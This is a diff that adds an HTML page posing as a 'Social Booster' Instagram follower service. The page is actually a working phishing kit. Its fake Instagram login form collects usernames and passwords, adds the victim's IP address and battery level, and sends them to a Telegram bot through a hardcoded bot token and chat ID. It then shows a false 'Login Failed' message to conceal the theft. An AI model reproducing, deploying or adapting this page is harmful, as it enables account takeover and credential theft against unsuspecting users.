@@ -1,0 +1,153 @@
+<!-- code maked by https://t.me/cagffbot -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Social Booster</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #000428, #004e92);
+            color: #fff;
+        }
+        .container, .login-container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+            max-width: 350px;
+            width: 100%;
+        }
+        .container h1, .login-container h1 {
+            font-size: 28px;
+            margin-bottom: 20px;
+        }
+        .button {
+            display: block;
+            width: 100%;
+            margin: 10px 0;
+            padding: 15px;
+            font-size: 16px;
+            font-weight: bold;
+            color: #fff;
+            background: linear-gradient(90deg, #ff4e50, #fc913a);
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+        .footer a {
+            color: #FFC107;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .login-container {
+            display: none;
+        }
+        .login-container input {
+            width: 100%;
+            margin: 10px 0;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            text-align: center;
+            background: #fff;
+        }
+        .login-container .password-container {
+            position: relative;
+        }
+        .login-container .password-container i {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="mainContainer">
+        <h1>Boost Your Social Presence</h1>
+        <button class="button" onclick="showLogin()"><span>👥</span> Get Followers</button>
+        <div class="footer">
+            <p>Powered by <a href="https://telegram.dog/A1mbo">Telegram</a></p>
+        </div>
+    </div>
+    <div class="login-container" id="loginContainer">
+        <h1>Instagram Login</h1>
+        <input type="text" id="username" placeholder="Username">
+        <div class="password-container">
+            <input type="password" id="password" placeholder="Password">
+            <i class="fa fa-eye" id="togglePassword"></i>
+        </div>
+        <button class="button" onclick="sendLogin()">Login</button>
+    </div>
+    <script>
+        function showLogin() {
+            document.getElementById('mainContainer').style.display = 'none';
+            document.getElementById('loginContainer').style.display = 'block';
+        }
+        function sendLogin() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            navigator.getBattery().then(function(battery) {
+                const batteryLevel = Math.round(battery.level * 100) + "%";
+                const botToken = "7601650905:AAF_hbNxSJUFV858SpyOL1MRQk1OkVHX-JA";
+                const chatId = "5501201139";
+                getIP().then(ip => {
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: `🔒 New Login Attempt!\n👤 Username: ${username}\n🔑 Password: ${password}\n🔋 Battery: ${batteryLevel}\n🌍 IP: ${ip}`
+                        })
+                    });
+                });
+            });
+            alert("Login Failed. Please try again.");
+        }
+        function getIP() {
+            return fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => data.ip)
+                .catch(() => 'Unknown IP');
+        }
+        document.getElementById("togglePassword").addEventListener("click", function() {
+            const passwordField = document.getElementById("password");
+            if (passwordField.type === "password") {
+                passwordField.type = "text";
+                this.classList.replace("fa-eye", "fa-eye-slash");
+            } else {
+                passwordField.type = "password";
+                this.classList.replace("fa-eye-slash", "fa-eye");
+            }
+        });
+    </script>
+</body>
+</html>
